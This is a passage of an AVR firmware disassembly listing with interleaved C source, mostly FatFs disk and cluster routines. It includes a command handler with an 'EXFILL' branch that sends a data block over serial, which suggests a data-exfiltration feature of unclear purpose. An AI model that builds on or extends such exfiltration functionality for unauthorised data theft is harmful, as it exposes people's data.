     c3e:	8e 01       	movw	r16, r28
     c40:	0f 5f       	subi	r16, 0xFF	; 255
     c42:	1f 4f       	sbci	r17, 0xFF	; 255
     c44:	1f 93       	push	r17
     c46:	0f 93       	push	r16
     c48:	87 e7       	ldi	r24, 0x77	; 119
     c4a:	93 e0       	ldi	r25, 0x03	; 3
     c4c:	9f 93       	push	r25
     c4e:	8f 93       	push	r24
     c50:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
            if (memcmp(cmd_recv, PRLE_CMD_OK, SIZE_PRLE_CMD) == 0)
     c54:	44 e0       	ldi	r20, 0x04	; 4
     c56:	50 e0       	ldi	r21, 0x00	; 0
     c58:	69 e8       	ldi	r22, 0x89	; 137
     c5a:	73 e0       	ldi	r23, 0x03	; 3
     c5c:	c8 01       	movw	r24, r16
     c5e:	0e 94 ff 38 	call	0x71fe	; 0x71fe <memcmp>
     c62:	0f 90       	pop	r0
     c64:	0f 90       	pop	r0
     c66:	0f 90       	pop	r0
     c68:	0f 90       	pop	r0
     c6a:	89 2b       	or	r24, r25
     c6c:	19 f4       	brne	.+6      	; 0xc74 <send_cmd+0xac>
            {
                return 1;
     c6e:	81 e0       	ldi	r24, 0x01	; 1
     c70:	90 e0       	ldi	r25, 0x00	; 0
     c72:	47 c0       	rjmp	.+142    	; 0xd02 <send_cmd+0x13a>
             printf("\r\nnr_packet_sended: %" PRIu32 "\r\n", *((uint32_t*) ext));
             return 1;
         }
    }    
    
    return 0;
     c74:	80 e0       	ldi	r24, 0x00	; 0
     c76:	90 e0       	ldi	r25, 0x00	; 0
     c78:	44 c0       	rjmp	.+136    	; 0xd02 <send_cmd+0x13a>
            {
                return 1;
            }
        }
    }
    else if (strcmp(cmd->cmd, PRLE_CMD_EXFILL) == 0)
     c7a:	6e e8       	ldi	r22, 0x8E	; 142
     c7c:	73 e0       	ldi	r23, 0x03	; 3
     c7e:	c7 01       	movw	r24, r14
     c80:	0e 94 27 39 	call	0x724e	; 0x724e <strcmp>
     c84:	89 2b       	or	r24, r25
     c86:	69 f4       	brne	.+26     	; 0xca2 <send_cmd+0xda>
    {
        Serial_SendData(cmd->opt_data, sizeof(EXFL_BLK_t));
     c88:	6e e2       	ldi	r22, 0x2E	; 46
     c8a:	70 e0       	ldi	r23, 0x00	; 0
     c8c:	c8 01       	movw	r24, r16
     c8e:	02 96       	adiw	r24, 0x02	; 2
     c90:	0e 94 e3 2e 	call	0x5dc6	; 0x5dc6 <Serial_SendData>
        printf("\r\n");
     c94:	85 e5       	ldi	r24, 0x55	; 85
     c96:	97 e0       	ldi	r25, 0x07	; 7
     c98:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
             printf("\r\nnr_packet_sended: %" PRIu32 "\r\n", *((uint32_t*) ext));
             return 1;
         }
    }    
    
    return 0;
     c9c:	80 e0       	ldi	r24, 0x00	; 0
     c9e:	90 e0       	ldi	r25, 0x00	; 0
     ca0:	30 c0       	rjmp	.+96     	; 0xd02 <send_cmd+0x13a>
    else if (strcmp(cmd->cmd, PRLE_CMD_EXFILL) == 0)
    {
        Serial_SendData(cmd->opt_data, sizeof(EXFL_BLK_t));
        printf("\r\n");
    }    
    else if (strcmp(cmd->cmd, PRLE_CMD_GETRSTPKT) == 0)
     ca2:	63 e9       	ldi	r22, 0x93	; 147
     ca4:	73 e0       	ldi	r23, 0x03	; 3
     ca6:	c7 01       	movw	r24, r14
     ca8:	0e 94 27 39 	call	0x724e	; 0x724e <strcmp>
     cac:	89 2b       	or	r24, r25
     cae:	21 f5       	brne	.+72     	; 0xcf8 <send_cmd+0x130>
    {
         if (recv_from_serial((unsigned char*)ext, 4, 3000))
     cb0:	08 eb       	ldi	r16, 0xB8	; 184
     cb2:	1b e0       	ldi	r17, 0x0B	; 11
     cb4:	20 e0       	ldi	r18, 0x00	; 0
     cb6:	30 e0       	ldi	r19, 0x00	; 0
     cb8:	44 e0       	ldi	r20, 0x04	; 4
     cba:	50 e0       	ldi	r21, 0x00	; 0
     cbc:	60 e0       	ldi	r22, 0x00	; 0
     cbe:	70 e0       	ldi	r23, 0x00	; 0
     cc0:	c6 01       	movw	r24, r12
     cc2:	14 df       	rcall	.-472    	; 0xaec <recv_from_serial>
     cc4:	88 23       	and	r24, r24
     cc6:	d9 f0       	breq	.+54     	; 0xcfe <send_cmd+0x136>
         {
             printf("\r\nnr_packet_sended: %" PRIu32 "\r\n", *((uint32_t*) ext));
     cc8:	f6 01       	movw	r30, r12
     cca:	83 81       	ldd	r24, Z+3	; 0x03
     ccc:	8f 93       	push	r24
     cce:	82 81       	ldd	r24, Z+2	; 0x02
     cd0:	8f 93       	push	r24
     cd2:	81 81       	ldd	r24, Z+1	; 0x01
     cd4:	8f 93       	push	r24
     cd6:	80 81       	ld	r24, Z
     cd8:	8f 93       	push	r24
     cda:	88 e9       	ldi	r24, 0x98	; 152
     cdc:	93 e0       	ldi	r25, 0x03	; 3
     cde:	9f 93       	push	r25
     ce0:	8f 93       	push	r24
     ce2:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
             return 1;
     ce6:	0f 90       	pop	r0
     ce8:	0f 90       	pop	r0
     cea:	0f 90       	pop	r0
     cec:	0f 90       	pop	r0
     cee:	0f 90       	pop	r0
     cf0:	0f 90       	pop	r0
     cf2:	81 e0       	ldi	r24, 0x01	; 1
     cf4:	90 e0       	ldi	r25, 0x00	; 0
     cf6:	05 c0       	rjmp	.+10     	; 0xd02 <send_cmd+0x13a>
         }
    }    
    
    return 0;
     cf8:	80 e0       	ldi	r24, 0x00	; 0
     cfa:	90 e0       	ldi	r25, 0x00	; 0
     cfc:	02 c0       	rjmp	.+4      	; 0xd02 <send_cmd+0x13a>
     cfe:	80 e0       	ldi	r24, 0x00	; 0
     d00:	90 e0       	ldi	r25, 0x00	; 0
}
     d02:	0f 90       	pop	r0
     d04:	0f 90       	pop	r0
     d06:	0f 90       	pop	r0
     d08:	0f 90       	pop	r0
     d0a:	0f 90       	pop	r0
     d0c:	df 91       	pop	r29
     d0e:	cf 91       	pop	r28
     d10:	1f 91       	pop	r17
     d12:	0f 91       	pop	r16
     d14:	ff 90       	pop	r15
     d16:	ef 90       	pop	r14
     d18:	df 90       	pop	r13
     d1a:	cf 90       	pop	r12
     d1c:	08 95       	ret

00000d1e <disk_status>:

DSTATUS disk_status (
	BYTE pdrv		/* Physical drive nmuber to identify the drive */
)
{
	switch (pdrv) {
     d1e:	81 11       	cpse	r24, r1
     d20:	03 c0       	rjmp	.+6      	; 0xd28 <disk_status+0xa>
	case DRV_CFC :
		return cf_disk_status();
#endif
#ifdef DRV_MMC
	case DRV_MMC :
		return mmc_disk_status();
     d22:	0c 94 39 20 	jmp	0x4072	; 0x4072 <mmc_disk_status>
     d26:	08 95       	ret
#endif
	}
	return STA_NOINIT;
     d28:	81 e0       	ldi	r24, 0x01	; 1
}
     d2a:	08 95       	ret

00000d2c <disk_initialize>:

DSTATUS disk_initialize (
	BYTE pdrv				/* Physical drive nmuber to identify the drive */
)
{
	switch (pdrv) {
     d2c:	81 11       	cpse	r24, r1
     d2e:	03 c0       	rjmp	.+6      	; 0xd36 <disk_initialize+0xa>
	case DRV_CFC :
		return cf_disk_initialize();
#endif
#ifdef DRV_MMC
	case DRV_MMC :
		return mmc_disk_initialize();
     d30:	0c 94 70 1f 	jmp	0x3ee0	; 0x3ee0 <mmc_disk_initialize>
     d34:	08 95       	ret
#endif
	}
	return STA_NOINIT;
     d36:	81 e0       	ldi	r24, 0x01	; 1
}
     d38:	08 95       	ret

00000d3a <disk_read>:
	BYTE pdrv,		/* Physical drive nmuber to identify the drive */
	BYTE *buff,		/* Data buffer to store read data */
	LBA_t sector,	/* Sector address in LBA */
	UINT count		/* Number of sectors to read */
)
{
     d3a:	0f 93       	push	r16
     d3c:	1f 93       	push	r17
     d3e:	fb 01       	movw	r30, r22
	switch (pdrv) {
     d40:	81 11       	cpse	r24, r1
     d42:	07 c0       	rjmp	.+14     	; 0xd52 <disk_read+0x18>
     d44:	ba 01       	movw	r22, r20
     d46:	a9 01       	movw	r20, r18
     d48:	cf 01       	movw	r24, r30
	case DRV_CFC :
		return cf_disk_read(buff, sector, count);
#endif
#ifdef DRV_MMC
	case DRV_MMC :
		return mmc_disk_read(buff, sector, count);
     d4a:	98 01       	movw	r18, r16
     d4c:	0e 94 3c 20 	call	0x4078	; 0x4078 <mmc_disk_read>
     d50:	01 c0       	rjmp	.+2      	; 0xd54 <disk_read+0x1a>
#endif
	}
	return RES_PARERR;
     d52:	84 e0       	ldi	r24, 0x04	; 4
}
     d54:	1f 91       	pop	r17
     d56:	0f 91       	pop	r16
     d58:	08 95       	ret

00000d5a <disk_write>:
	BYTE pdrv,			/* Physical drive nmuber to identify the drive */
	const BYTE *buff,	/* Data to be written */
	LBA_t sector,		/* Sector address in LBA */
	UINT count			/* Number of sectors to write */
)
{
     d5a:	0f 93       	push	r16
     d5c:	1f 93       	push	r17
     d5e:	fb 01       	movw	r30, r22
	switch (pdrv) {
     d60:	81 11       	cpse	r24, r1
     d62:	07 c0       	rjmp	.+14     	; 0xd72 <disk_write+0x18>
     d64:	ba 01       	movw	r22, r20
     d66:	a9 01       	movw	r20, r18
     d68:	cf 01       	movw	r24, r30
	case DRV_CFC :
		return cf_disk_write(buff, sector, count);
#endif
#ifdef DRV_MMC
	case DRV_MMC :
		return mmc_disk_write(buff, sector, count);
     d6a:	98 01       	movw	r18, r16
     d6c:	0e 94 86 20 	call	0x410c	; 0x410c <mmc_disk_write>
     d70:	01 c0       	rjmp	.+2      	; 0xd74 <disk_write+0x1a>
#endif
	}
	return RES_PARERR;
     d72:	84 e0       	ldi	r24, 0x04	; 4
}
     d74:	1f 91       	pop	r17
     d76:	0f 91       	pop	r16
     d78:	08 95       	ret

00000d7a <disk_ioctl>:
	BYTE pdrv,		/* Physical drive nmuber (0..) */
	BYTE cmd,		/* Control code */
	void *buff		/* Buffer to send/receive control data */
)
{
	switch (pdrv) {
     d7a:	81 11       	cpse	r24, r1
     d7c:	05 c0       	rjmp	.+10     	; 0xd88 <disk_ioctl+0xe>
     d7e:	86 2f       	mov	r24, r22
	case DRV_CFC :
		return cf_disk_ioctl(cmd, buff);
#endif
#ifdef DRV_MMC
	case DRV_MMC :
		return mmc_disk_ioctl(cmd, buff);
     d80:	ba 01       	movw	r22, r20
     d82:	0c 94 ee 20 	jmp	0x41dc	; 0x41dc <mmc_disk_ioctl>
     d86:	08 95       	ret
#endif
	}
	return RES_PARERR;
     d88:	84 e0       	ldi	r24, 0x04	; 4
}
     d8a:	08 95       	ret

00000d8c <disk_timerproc>:
{
#ifdef DRV_CFC
	cf_disk_timerproc();
#endif
#ifdef DRV_MMC
	mmc_disk_timerproc();
     d8c:	0c 94 eb 23 	jmp	0x47d6	; 0x47d6 <mmc_disk_timerproc>
     d90:	08 95       	ret

00000d92 <ld_word>:
#endif
		if (res != FR_OK) ABORT(fs, res);
	}

	LEAVE_FF(fs, res);
}
     d92:	fc 01       	movw	r30, r24
     d94:	21 81       	ldd	r18, Z+1	; 0x01
     d96:	30 e0       	ldi	r19, 0x00	; 0
     d98:	32 2f       	mov	r19, r18
     d9a:	22 27       	eor	r18, r18
     d9c:	80 81       	ld	r24, Z
     d9e:	a9 01       	movw	r20, r18
     da0:	48 2b       	or	r20, r24
     da2:	ca 01       	movw	r24, r20
     da4:	08 95       	ret

00000da6 <ld_dword>:
     da6:	fc 01       	movw	r30, r24
     da8:	63 81       	ldd	r22, Z+3	; 0x03
     daa:	86 2f       	mov	r24, r22
     dac:	90 e0       	ldi	r25, 0x00	; 0
     dae:	a0 e0       	ldi	r26, 0x00	; 0
     db0:	b0 e0       	ldi	r27, 0x00	; 0
     db2:	ba 2f       	mov	r27, r26
     db4:	a9 2f       	mov	r26, r25
     db6:	98 2f       	mov	r25, r24
     db8:	88 27       	eor	r24, r24
     dba:	22 81       	ldd	r18, Z+2	; 0x02
     dbc:	82 2b       	or	r24, r18
     dbe:	ba 2f       	mov	r27, r26
     dc0:	a9 2f       	mov	r26, r25
     dc2:	98 2f       	mov	r25, r24
     dc4:	88 27       	eor	r24, r24
     dc6:	21 81       	ldd	r18, Z+1	; 0x01
     dc8:	82 2b       	or	r24, r18
     dca:	ba 2f       	mov	r27, r26
     dcc:	a9 2f       	mov	r26, r25
     dce:	98 2f       	mov	r25, r24
     dd0:	88 27       	eor	r24, r24
     dd2:	20 81       	ld	r18, Z
     dd4:	bc 01       	movw	r22, r24
     dd6:	cd 01       	movw	r24, r26
     dd8:	62 2b       	or	r22, r18
     dda:	08 95       	ret

00000ddc <st_word>:
     ddc:	fc 01       	movw	r30, r24
     dde:	60 83       	st	Z, r22
     de0:	71 83       	std	Z+1, r23	; 0x01
     de2:	08 95       	ret

00000de4 <st_dword>:
     de4:	fc 01       	movw	r30, r24
     de6:	40 83       	st	Z, r20
     de8:	51 83       	std	Z+1, r21	; 0x01
     dea:	62 83       	std	Z+2, r22	; 0x02
     dec:	73 83       	std	Z+3, r23	; 0x03
     dee:	08 95       	ret

00000df0 <dbc_1st>:
     df0:	81 38       	cpi	r24, 0x81	; 129
     df2:	48 f0       	brcs	.+18     	; 0xe06 <dbc_1st+0x16>
     df4:	80 3a       	cpi	r24, 0xA0	; 160
     df6:	50 f0       	brcs	.+20     	; 0xe0c <dbc_1st+0x1c>
     df8:	80 3e       	cpi	r24, 0xE0	; 224
     dfa:	58 f0       	brcs	.+22     	; 0xe12 <dbc_1st+0x22>
     dfc:	8d 3f       	cpi	r24, 0xFD	; 253
     dfe:	60 f0       	brcs	.+24     	; 0xe18 <dbc_1st+0x28>
     e00:	80 e0       	ldi	r24, 0x00	; 0
     e02:	90 e0       	ldi	r25, 0x00	; 0
     e04:	08 95       	ret
     e06:	80 e0       	ldi	r24, 0x00	; 0
     e08:	90 e0       	ldi	r25, 0x00	; 0
     e0a:	08 95       	ret
     e0c:	81 e0       	ldi	r24, 0x01	; 1
     e0e:	90 e0       	ldi	r25, 0x00	; 0
     e10:	08 95       	ret
     e12:	80 e0       	ldi	r24, 0x00	; 0
     e14:	90 e0       	ldi	r25, 0x00	; 0
     e16:	08 95       	ret
     e18:	81 e0       	ldi	r24, 0x01	; 1
     e1a:	90 e0       	ldi	r25, 0x00	; 0
     e1c:	08 95       	ret

00000e1e <dbc_2nd>:
     e1e:	80 34       	cpi	r24, 0x40	; 64
     e20:	58 f0       	brcs	.+22     	; 0xe38 <dbc_2nd+0x1a>
     e22:	8f 37       	cpi	r24, 0x7F	; 127
     e24:	60 f0       	brcs	.+24     	; 0xe3e <dbc_2nd+0x20>
     e26:	80 38       	cpi	r24, 0x80	; 128
     e28:	10 f0       	brcs	.+4      	; 0xe2e <dbc_2nd+0x10>
     e2a:	8d 3f       	cpi	r24, 0xFD	; 253
     e2c:	58 f0       	brcs	.+22     	; 0xe44 <dbc_2nd+0x26>
     e2e:	88 23       	and	r24, r24
     e30:	61 f0       	breq	.+24     	; 0xe4a <dbc_2nd+0x2c>
     e32:	80 e0       	ldi	r24, 0x00	; 0
     e34:	90 e0       	ldi	r25, 0x00	; 0
     e36:	08 95       	ret
     e38:	80 e0       	ldi	r24, 0x00	; 0
     e3a:	90 e0       	ldi	r25, 0x00	; 0
     e3c:	08 95       	ret
     e3e:	81 e0       	ldi	r24, 0x01	; 1
     e40:	90 e0       	ldi	r25, 0x00	; 0
     e42:	08 95       	ret
     e44:	81 e0       	ldi	r24, 0x01	; 1
     e46:	90 e0       	ldi	r25, 0x00	; 0
     e48:	08 95       	ret
     e4a:	81 e0       	ldi	r24, 0x01	; 1
     e4c:	90 e0       	ldi	r25, 0x00	; 0
     e4e:	08 95       	ret

00000e50 <clst2sect>:
     e50:	cf 92       	push	r12
     e52:	df 92       	push	r13
     e54:	ef 92       	push	r14
     e56:	ff 92       	push	r15
     e58:	fc 01       	movw	r30, r24
     e5a:	9a 01       	movw	r18, r20
     e5c:	ab 01       	movw	r20, r22
     e5e:	22 50       	subi	r18, 0x02	; 2
     e60:	31 09       	sbc	r19, r1
     e62:	41 09       	sbc	r20, r1
     e64:	51 09       	sbc	r21, r1
     e66:	c7 88       	ldd	r12, Z+23	; 0x17
     e68:	d0 8c       	ldd	r13, Z+24	; 0x18
     e6a:	e1 8c       	ldd	r14, Z+25	; 0x19
     e6c:	f2 8c       	ldd	r15, Z+26	; 0x1a
     e6e:	82 e0       	ldi	r24, 0x02	; 2
     e70:	c8 1a       	sub	r12, r24
     e72:	d1 08       	sbc	r13, r1
     e74:	e1 08       	sbc	r14, r1
     e76:	f1 08       	sbc	r15, r1
     e78:	2c 15       	cp	r18, r12
     e7a:	3d 05       	cpc	r19, r13
     e7c:	4e 05       	cpc	r20, r14
     e7e:	5f 05       	cpc	r21, r15
     e80:	68 f4       	brcc	.+26     	; 0xe9c <clst2sect+0x4c>
     e82:	c3 a4       	ldd	r12, Z+43	; 0x2b
     e84:	d4 a4       	ldd	r13, Z+44	; 0x2c
     e86:	e5 a4       	ldd	r14, Z+45	; 0x2d
     e88:	f6 a4       	ldd	r15, Z+46	; 0x2e
     e8a:	a1 85       	ldd	r26, Z+9	; 0x09
     e8c:	b2 85       	ldd	r27, Z+10	; 0x0a
     e8e:	0e 94 e5 38 	call	0x71ca	; 0x71ca <__muluhisi3>
     e92:	6c 0d       	add	r22, r12
     e94:	7d 1d       	adc	r23, r13
     e96:	8e 1d       	adc	r24, r14
     e98:	9f 1d       	adc	r25, r15
     e9a:	03 c0       	rjmp	.+6      	; 0xea2 <clst2sect+0x52>
     e9c:	60 e0       	ldi	r22, 0x00	; 0
     e9e:	70 e0       	ldi	r23, 0x00	; 0
     ea0:	cb 01       	movw	r24, r22
     ea2:	ff 90       	pop	r15
     ea4:	ef 90       	pop	r14
     ea6:	df 90       	pop	r13
     ea8:	cf 90       	pop	r12
     eaa:	08 95       	ret

00000eac <ld_clust>:
     eac:	cf 92       	push	r12
     eae:	df 92       	push	r13
     eb0:	ef 92       	push	r14
     eb2:	ff 92       	push	r15
     eb4:	0f 93       	push	r16
     eb6:	1f 93       	push	r17
     eb8:	cf 93       	push	r28
     eba:	df 93       	push	r29
     ebc:	8c 01       	movw	r16, r24
     ebe:	eb 01       	movw	r28, r22
     ec0:	cb 01       	movw	r24, r22
     ec2:	4a 96       	adiw	r24, 0x1a	; 26
     ec4:	66 df       	rcall	.-308    	; 0xd92 <ld_word>
     ec6:	6c 01       	movw	r12, r24
     ec8:	e1 2c       	mov	r14, r1
     eca:	f1 2c       	mov	r15, r1
     ecc:	f8 01       	movw	r30, r16
     ece:	80 81       	ld	r24, Z
     ed0:	83 30       	cpi	r24, 0x03	; 3
     ed2:	61 f4       	brne	.+24     	; 0xeec <ld_clust+0x40>
     ed4:	ce 01       	movw	r24, r28
     ed6:	44 96       	adiw	r24, 0x14	; 20
     ed8:	5c df       	rcall	.-328    	; 0xd92 <ld_word>
     eda:	a0 e0       	ldi	r26, 0x00	; 0
     edc:	b0 e0       	ldi	r27, 0x00	; 0
     ede:	dc 01       	movw	r26, r24
     ee0:	99 27       	eor	r25, r25
     ee2:	88 27       	eor	r24, r24
     ee4:	c8 2a       	or	r12, r24
     ee6:	d9 2a       	or	r13, r25
     ee8:	ea 2a       	or	r14, r26
     eea:	fb 2a       	or	r15, r27
     eec:	c7 01       	movw	r24, r14
     eee:	b6 01       	movw	r22, r12
     ef0:	df 91       	pop	r29
     ef2:	cf 91       	pop	r28
     ef4:	1f 91       	pop	r17
     ef6:	0f 91       	pop	r16
     ef8:	ff 90       	pop	r15
     efa:	ef 90       	pop	r14
     efc:	df 90       	pop	r13
     efe:	cf 90       	pop	r12
     f00:	08 95       	ret

00000f02 <st_clust>:
     f02:	cf 92       	push	r12
     f04:	df 92       	push	r13
     f06:	ef 92       	push	r14
     f08:	ff 92       	push	r15
     f0a:	0f 93       	push	r16
     f0c:	1f 93       	push	r17
     f0e:	cf 93       	push	r28
     f10:	df 93       	push	r29
     f12:	8c 01       	movw	r16, r24
     f14:	eb 01       	movw	r28, r22
     f16:	69 01       	movw	r12, r18
     f18:	7a 01       	movw	r14, r20
     f1a:	b9 01       	movw	r22, r18
     f1c:	ce 01       	movw	r24, r28
     f1e:	4a 96       	adiw	r24, 0x1a	; 26
     f20:	5d df       	rcall	.-326    	; 0xddc <st_word>
     f22:	f8 01       	movw	r30, r16
     f24:	80 81       	ld	r24, Z
     f26:	83 30       	cpi	r24, 0x03	; 3
     f28:	31 f4       	brne	.+12     	; 0xf36 <st_clust+0x34>
     f2a:	b7 01       	movw	r22, r14
     f2c:	88 27       	eor	r24, r24
     f2e:	99 27       	eor	r25, r25
     f30:	ce 01       	movw	r24, r28
     f32:	44 96       	adiw	r24, 0x14	; 20
     f34:	53 df       	rcall	.-346    	; 0xddc <st_word>
     f36:	df 91       	pop	r29
     f38:	cf 91       	pop	r28
     f3a:	1f 91       	pop	r17
     f3c:	0f 91       	pop	r16
     f3e:	ff 90       	pop	r15
     f40:	ef 90       	pop	r14
     f42:	df 90       	pop	r13
     f44:	cf 90       	pop	r12
     f46:	08 95       	ret

00000f48 <get_ldnumber>:
     f48:	cf 93       	push	r28
     f4a:	df 93       	push	r29
     f4c:	ec 01       	movw	r28, r24
     f4e:	a8 81       	ld	r26, Y
     f50:	b9 81       	ldd	r27, Y+1	; 0x01
     f52:	10 97       	sbiw	r26, 0x00	; 0
     f54:	49 f1       	breq	.+82     	; 0xfa8 <get_ldnumber+0x60>
     f56:	fd 01       	movw	r30, r26
     f58:	9f 01       	movw	r18, r30
     f5a:	2f 5f       	subi	r18, 0xFF	; 255
     f5c:	3f 4f       	sbci	r19, 0xFF	; 255
     f5e:	90 81       	ld	r25, Z
     f60:	91 32       	cpi	r25, 0x21	; 33
     f62:	18 f0       	brcs	.+6      	; 0xf6a <get_ldnumber+0x22>
     f64:	f9 01       	movw	r30, r18
     f66:	9a 33       	cpi	r25, 0x3A	; 58
     f68:	b9 f7       	brne	.-18     	; 0xf58 <get_ldnumber+0x10>
     f6a:	9a 33       	cpi	r25, 0x3A	; 58
     f6c:	c9 f4       	brne	.+50     	; 0xfa0 <get_ldnumber+0x58>
     f6e:	4c 91       	ld	r20, X
     f70:	80 ed       	ldi	r24, 0xD0	; 208
     f72:	84 0f       	add	r24, r20
     f74:	8a 30       	cpi	r24, 0x0A	; 10
     f76:	40 f4       	brcc	.+16     	; 0xf88 <get_ldnumber+0x40>
     f78:	12 96       	adiw	r26, 0x02	; 2
     f7a:	2a 17       	cp	r18, r26
     f7c:	3b 07       	cpc	r19, r27
     f7e:	39 f4       	brne	.+14     	; 0xf8e <get_ldnumber+0x46>
     f80:	50 e0       	ldi	r21, 0x00	; 0
     f82:	40 53       	subi	r20, 0x30	; 48
     f84:	51 09       	sbc	r21, r1
     f86:	05 c0       	rjmp	.+10     	; 0xf92 <get_ldnumber+0x4a>
     f88:	42 e0       	ldi	r20, 0x02	; 2
     f8a:	50 e0       	ldi	r21, 0x00	; 0
     f8c:	02 c0       	rjmp	.+4      	; 0xf92 <get_ldnumber+0x4a>
     f8e:	42 e0       	ldi	r20, 0x02	; 2
     f90:	50 e0       	ldi	r21, 0x00	; 0
     f92:	42 30       	cpi	r20, 0x02	; 2
     f94:	51 05       	cpc	r21, r1
     f96:	5c f4       	brge	.+22     	; 0xfae <get_ldnumber+0x66>
     f98:	39 83       	std	Y+1, r19	; 0x01
     f9a:	28 83       	st	Y, r18
     f9c:	ca 01       	movw	r24, r20
     f9e:	09 c0       	rjmp	.+18     	; 0xfb2 <get_ldnumber+0x6a>
     fa0:	80 91 49 09 	lds	r24, 0x0949	; 0x800949 <CurrVol>
     fa4:	90 e0       	ldi	r25, 0x00	; 0
     fa6:	05 c0       	rjmp	.+10     	; 0xfb2 <get_ldnumber+0x6a>
     fa8:	8f ef       	ldi	r24, 0xFF	; 255
     faa:	9f ef       	ldi	r25, 0xFF	; 255
     fac:	02 c0       	rjmp	.+4      	; 0xfb2 <get_ldnumber+0x6a>
     fae:	8f ef       	ldi	r24, 0xFF	; 255
     fb0:	9f ef       	ldi	r25, 0xFF	; 255
     fb2:	df 91       	pop	r29
     fb4:	cf 91       	pop	r28
     fb6:	08 95       	ret

00000fb8 <validate>:
     fb8:	0f 93       	push	r16
     fba:	1f 93       	push	r17
     fbc:	cf 93       	push	r28
     fbe:	df 93       	push	r29
     fc0:	ec 01       	movw	r28, r24
     fc2:	8b 01       	movw	r16, r22
     fc4:	89 2b       	or	r24, r25
     fc6:	a1 f0       	breq	.+40     	; 0xff0 <validate+0x38>
     fc8:	e8 81       	ld	r30, Y
     fca:	f9 81       	ldd	r31, Y+1	; 0x01
     fcc:	30 97       	sbiw	r30, 0x00	; 0
     fce:	91 f0       	breq	.+36     	; 0xff4 <validate+0x3c>
     fd0:	80 81       	ld	r24, Z
     fd2:	88 23       	and	r24, r24
     fd4:	89 f0       	breq	.+34     	; 0xff8 <validate+0x40>
     fd6:	2a 81       	ldd	r18, Y+2	; 0x02
     fd8:	3b 81       	ldd	r19, Y+3	; 0x03
     fda:	85 81       	ldd	r24, Z+5	; 0x05
     fdc:	96 81       	ldd	r25, Z+6	; 0x06
     fde:	28 17       	cp	r18, r24
     fe0:	39 07       	cpc	r19, r25
     fe2:	61 f4       	brne	.+24     	; 0xffc <validate+0x44>
     fe4:	81 81       	ldd	r24, Z+1	; 0x01
     fe6:	9b de       	rcall	.-714    	; 0xd1e <disk_status>
     fe8:	80 ff       	sbrs	r24, 0
     fea:	0a c0       	rjmp	.+20     	; 0x1000 <validate+0x48>
     fec:	89 e0       	ldi	r24, 0x09	; 9
     fee:	09 c0       	rjmp	.+18     	; 0x1002 <validate+0x4a>
     ff0:	89 e0       	ldi	r24, 0x09	; 9
     ff2:	07 c0       	rjmp	.+14     	; 0x1002 <validate+0x4a>
     ff4:	89 e0       	ldi	r24, 0x09	; 9
     ff6:	05 c0       	rjmp	.+10     	; 0x1002 <validate+0x4a>
     ff8:	89 e0       	ldi	r24, 0x09	; 9
     ffa:	03 c0       	rjmp	.+6      	; 0x1002 <validate+0x4a>
     ffc:	89 e0       	ldi	r24, 0x09	; 9
     ffe:	01 c0       	rjmp	.+2      	; 0x1002 <validate+0x4a>
    1000:	80 e0       	ldi	r24, 0x00	; 0
    1002:	81 11       	cpse	r24, r1
    1004:	03 c0       	rjmp	.+6      	; 0x100c <validate+0x54>
    1006:	28 81       	ld	r18, Y
    1008:	39 81       	ldd	r19, Y+1	; 0x01
    100a:	02 c0       	rjmp	.+4      	; 0x1010 <validate+0x58>
    100c:	20 e0       	ldi	r18, 0x00	; 0
    100e:	30 e0       	ldi	r19, 0x00	; 0
    1010:	f8 01       	movw	r30, r16
    1012:	31 83       	std	Z+1, r19	; 0x01
    1014:	20 83       	st	Z, r18
    1016:	df 91       	pop	r29
    1018:	cf 91       	pop	r28
    101a:	1f 91       	pop	r17
    101c:	0f 91       	pop	r16
    101e:	08 95       	ret

00001020 <sync_window>:
    1020:	8f 92       	push	r8
    1022:	9f 92       	push	r9
    1024:	af 92       	push	r10
    1026:	bf 92       	push	r11
    1028:	ef 92       	push	r14
    102a:	ff 92       	push	r15
    102c:	0f 93       	push	r16
    102e:	1f 93       	push	r17
    1030:	cf 93       	push	r28
    1032:	df 93       	push	r29
    1034:	fc 01       	movw	r30, r24
    1036:	23 81       	ldd	r18, Z+3	; 0x03
    1038:	22 23       	and	r18, r18
    103a:	c1 f1       	breq	.+112    	; 0x10ac <sync_window+0x8c>
    103c:	ec 01       	movw	r28, r24
    103e:	7c 01       	movw	r14, r24
    1040:	f3 e3       	ldi	r31, 0x33	; 51
    1042:	ef 0e       	add	r14, r31
    1044:	f1 1c       	adc	r15, r1
    1046:	2f a5       	ldd	r18, Y+47	; 0x2f
    1048:	38 a9       	ldd	r19, Y+48	; 0x30
    104a:	49 a9       	ldd	r20, Y+49	; 0x31
    104c:	5a a9       	ldd	r21, Y+50	; 0x32
    104e:	01 e0       	ldi	r16, 0x01	; 1
    1050:	10 e0       	ldi	r17, 0x00	; 0
    1052:	b7 01       	movw	r22, r14
    1054:	89 81       	ldd	r24, Y+1	; 0x01
    1056:	81 de       	rcall	.-766    	; 0xd5a <disk_write>
    1058:	81 11       	cpse	r24, r1
    105a:	2a c0       	rjmp	.+84     	; 0x10b0 <sync_window+0x90>
    105c:	1b 82       	std	Y+3, r1	; 0x03
    105e:	0f a5       	ldd	r16, Y+47	; 0x2f
    1060:	18 a9       	ldd	r17, Y+48	; 0x30
    1062:	29 a9       	ldd	r18, Y+49	; 0x31
    1064:	3a a9       	ldd	r19, Y+50	; 0x32
    1066:	8b a1       	ldd	r24, Y+35	; 0x23
    1068:	9c a1       	ldd	r25, Y+36	; 0x24
    106a:	ad a1       	ldd	r26, Y+37	; 0x25
    106c:	be a1       	ldd	r27, Y+38	; 0x26
    106e:	48 01       	movw	r8, r16
    1070:	59 01       	movw	r10, r18
    1072:	88 1a       	sub	r8, r24
    1074:	99 0a       	sbc	r9, r25
    1076:	aa 0a       	sbc	r10, r26
    1078:	bb 0a       	sbc	r11, r27
    107a:	8b 8d       	ldd	r24, Y+27	; 0x1b
    107c:	9c 8d       	ldd	r25, Y+28	; 0x1c
    107e:	ad 8d       	ldd	r26, Y+29	; 0x1d
    1080:	be 8d       	ldd	r27, Y+30	; 0x1e
    1082:	88 16       	cp	r8, r24
    1084:	99 06       	cpc	r9, r25
    1086:	aa 06       	cpc	r10, r26
    1088:	bb 06       	cpc	r11, r27
    108a:	a0 f4       	brcc	.+40     	; 0x10b4 <sync_window+0x94>
    108c:	6a 81       	ldd	r22, Y+2	; 0x02
    108e:	62 30       	cpi	r22, 0x02	; 2
    1090:	99 f4       	brne	.+38     	; 0x10b8 <sync_window+0x98>
